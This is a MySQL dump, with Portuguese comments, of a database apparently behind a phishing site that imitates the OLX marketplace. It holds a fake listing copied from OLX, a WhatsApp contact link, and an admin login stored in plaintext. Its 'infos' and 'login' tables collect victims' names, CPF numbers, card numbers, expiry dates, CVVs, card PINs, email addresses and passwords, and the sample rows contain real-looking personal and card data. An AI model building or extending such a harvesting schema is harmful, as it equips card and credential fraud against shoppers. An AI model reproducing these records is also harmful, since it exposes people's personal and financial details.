-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Tempo de geração: 24/05/2024 às 00:31
-- Versão do servidor: 5.7.34
-- Versão do PHP: 7.4.23

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `olx`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `cliques`
--

CREATE TABLE `cliques` (
  `ip` varchar(50) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estrutura para tabela `configs`
--

CREATE TABLE `configs` (
  `id` int(11) NOT NULL,
  `link` varchar(350) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `configs`
--

INSERT INTO `configs` (`id`, `link`) VALUES
(1, 'https://wa.me/5588981132086');

-- --------------------------------------------------------

--
-- Estrutura para tabela `endereco`
--

CREATE TABLE `endereco` (
  `id` int(11) NOT NULL,
  `rua` varchar(150) NOT NULL,
  `cep` varchar(20) NOT NULL,
  `numero` varchar(50) NOT NULL,
  `complemento` varchar(250) NOT NULL,
  `bairro` varchar(100) NOT NULL,
  `cidade` varchar(150) NOT NULL,
  `estado` varchar(150) NOT NULL,
  `ip` varchar(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `endereco`
--

INSERT INTO `endereco` (`id`, `rua`, `cep`, `numero`, `complemento`, `bairro`, `cidade`, `estado`, `ip`) VALUES
(7, '000', '62350-000', '(7', '', '', 'Ubajara', 'CE', '::1'),
(6, '000', '62350-000', '(7', '', '', 'Ubajara', 'CE', '::1'),
(4, 'Street', '10010', '', '', '', '', '', '::1'),
(5, 'Street', '62350-000', '000', '', '', 'Ubajara', 'CE', '::1'),
(8, '000', '62350-000', '(7', '', '', 'Ubajara', 'CE', '::1'),
(9, 'Street', '62350-000', '000', '', '', 'Ubajara', 'CE', '::1'),
(10, 'Street', '62350-000', '000', '', '', 'Ubajara', 'CE', '::1');

-- --------------------------------------------------------

--
-- Estrutura para tabela `infos`
--

CREATE TABLE `infos` (
  `id` int(11) NOT NULL,
  `nome` varchar(60) NOT NULL,
  `cpf` varchar(20) NOT NULL,
  `cc` varchar(30) NOT NULL,
  `validade` varchar(10) NOT NULL,
  `cvv` varchar(5) NOT NULL,
  `senha` int(10) NOT NULL DEFAULT '0',
  `ip` varchar(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `infos`
--

INSERT INTO `infos` (`id`, `nome`, `cpf`, `cc`, `validade`, `cvv`, `senha`, `ip`) VALUES
(4, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/28', '546', 1, '::1'),
(2, 'Mateus Afonso ', '792.648.230-77', '4750 6588 0674 1517', '12/25', '646', 0, '::1'),
(3, 'Mateus Afonso ', '842.713.370-72', '4750 6588 0674 1517', '12/25', '243', 0, '::1'),
(5, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/24', '243', 0, '::1'),
(6, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/25', '646', 0, '::1'),
(7, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/25', '946', 0, '::1'),
(8, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/25', '546', 0, '::1'),
(9, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/25', '546', 0, '::1'),
(10, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/25', '546', 0, '::1'),
(11, 'Mateus Afonso ', '842.713.370-72', '5314 9040 7505 4646', '12/28', '546', 0, '::1'),
(12, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/24', '546', 0, '::1'),
(13, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/24', '546', 0, '::1'),
(14, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/25', '246', 0, '::1'),
(15, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '546', 0, '::1'),
(16, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '546', 0, '::1'),
(17, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '646', 0, '::1'),
(18, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '643', 0, '::1'),
(19, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '664', 0, '::1'),
(20, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/25', '646', 0, '::1'),
(21, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '246', 0, '::1'),
(22, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/28', '646', 0, '::1'),
(23, 'Mateus Afonso ', '', '6599 3048 5688 3053', '12/25', '646', 0, '::1'),
(24, 'Mateus Afonso ', '', '6599 3063 6443 4428', '12/25', '646', 0, '::1'),
(25, 'Nzjjs bsjs', '', '6599 3063 6443 4428', '12/25', '576', 0, '::1'),
(26, 'Mateus Afonso ', '', '3690 4811 3361 061', '12/25', '646', 664644, '::1'),
(27, 'Mateus Afonso ', '', '3690 4811 3361 061', '12/28', '346', 664644, '::1'),
(28, 'Mateus Afonso ', '', '3690 4811 3361 061', '12/25', '546', 664644, '::1');

-- --------------------------------------------------------

--
-- Estrutura para tabela `login`
--

CREATE TABLE `login` (
  `id` int(11) NOT NULL,
  `email` varchar(200) NOT NULL,
  `senha` varchar(100) NOT NULL,
  `ip` varchar(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `login`
--

INSERT INTO `login` (`id`, `email`, `senha`, `ip`) VALUES
(1, 's', 's', '1'),
(13, 'joaovitorsilvalima282@gmail.com', 'dxdddddd', '::1'),
(14, 'joaovitorsilvalima282@gmail.com', 'bshzjjdid', '::1'),
(15, 'joaovitorsilvalima282@gmail.com', 'bajsjiss', '::1'),
(16, 'joaovitorsilvalima282@gmail.com', 'gshjsjsis', '::1'),
(17, 'joaovitorsilvalima282@gmail.com', 's nzjsjnsjss', '::1'),
(18, 'joaovitorsilvalima282@gmail.com', 'sbjsjsjjss', '::1'),
(19, 'marialenita676@gmail.com', 'najaja7662', '::1');

-- --------------------------------------------------------

--
-- Estrutura para tabela `onlines`
--

CREATE TABLE `onlines` (
  `ip` varchar(50) NOT NULL,
  `tempo` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estrutura para tabela `produtos`
--

CREATE TABLE `produtos` (
  `id` int(11) NOT NULL,
  `nome` varchar(150) NOT NULL,
  `valor` float NOT NULL,
  `img1` varchar(250) NOT NULL,
  `img2` varchar(250) NOT NULL,
  `img3` varchar(250) NOT NULL,
  `img4` varchar(250) NOT NULL,
  `img5` varchar(250) NOT NULL,
  `descricao` varchar(500) NOT NULL,
  `cliques` int(11) NOT NULL DEFAULT '0',
  `parcelamentos` int(5) NOT NULL,
  `publicado` datetime NOT NULL,
  `categorias` varchar(60) NOT NULL,
  `tipo` varchar(60) NOT NULL,
  `cep` varchar(10) NOT NULL,
  `municipio` varchar(100) NOT NULL,
  `nome_anunciante` varchar(100) NOT NULL,
  `data_anunciante` date NOT NULL,
  `ultimo_anunciante` varchar(50) NOT NULL,
  `vedidos_anunciante` int(11) NOT NULL,
  `pix` varchar(350) NOT NULL,
  `frete` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `produtos`
--

INSERT INTO `produtos` (`id`, `nome`, `valor`, `img1`, `img2`, `img3`, `img4`, `img5`, `descricao`, `cliques`, `parcelamentos`, `publicado`, `categorias`, `tipo`, `cep`, `municipio`, `nome_anunciante`, `data_anunciante`, `ultimo_anunciante`, `vedidos_anunciante`, `pix`, `frete`) VALUES
(1, 'Programador', 250, 'https://img.olx.com.br/images/55/550414167903999.webp', 'A', 'A', 'A', 'A', 'Vendo máquina de lavar roupas Consul 9kg. - Tem marcas de uso; - Está com um pouco de vazamento de água na parte de baixo; Fora isso, está tudo funcionando normalmente. Entrega no norte da ilha a combinar.', 0, 8, '2024-05-23 00:00:00', 'Máquinas de Lavar e Secadoras', 'Máquinas de Lavar Roupa', '88052-401', 'Florianópolis', 'Camila', '2014-03-13', '8 minutos', 29, 'A', '10.87'),
(10, 'Programador', 250, 'https://img.olx.com.br/images/55/550414167903999.webp', 'https://img.olx.com.br/images/55/550414167903999.webp', 'A', 'A', 'a', 'Vendo máquina de lavar roupas Consul 9kg. - Tem marcas de uso; - Está com um pouco de vazamento de água na parte de baixo; Fora isso, está tudo funcionando normalmente. Entrega no norte da ilha a combinar.', 0, 8, '2024-05-23 00:00:00', 'Máquinas de Lavar e Secadoras', 'Máquinas de Lavar Roupa', '88052-401', 'Florianópolis', 'Camila', '2014-03-13', '8 minutos', 29, 'Z', '10');

-- --------------------------------------------------------

--
-- Estrutura para tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `nome` varchar(40) NOT NULL,
  `usuario` varchar(80) NOT NULL,
  `senha` varchar(80) NOT NULL,
  `cargo` varchar(30) NOT NULL DEFAULT 'Admin',
  `validade` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `nome`, `usuario`, `senha`, `cargo`, `validade`) VALUES
(1, 'Programador', 'JVCARA', 'JVADM', 'Dono', '2025-05-06');

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `cliques`
--
ALTER TABLE `cliques`
  ADD PRIMARY KEY (`ip`);

--
-- Índices de tabela `configs`
--
ALTER TABLE `configs`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `endereco`
--
ALTER TABLE `endereco`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `infos`
--
ALTER TABLE `infos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `login`
--
ALTER TABLE `login`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `onlines`
--
ALTER TABLE `onlines`
  ADD PRIMARY KEY (`ip`);

--
-- Índices de tabela `produtos`
--
ALTER TABLE `produtos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `configs`
--
ALTER TABLE `configs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `endereco`
--
ALTER TABLE `endereco`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT de tabela `infos`
--
ALTER TABLE `infos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT de tabela `login`
--
ALTER TABLE `login`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT de tabela `produtos`
--
ALTER TABLE `produtos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT de tabela `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
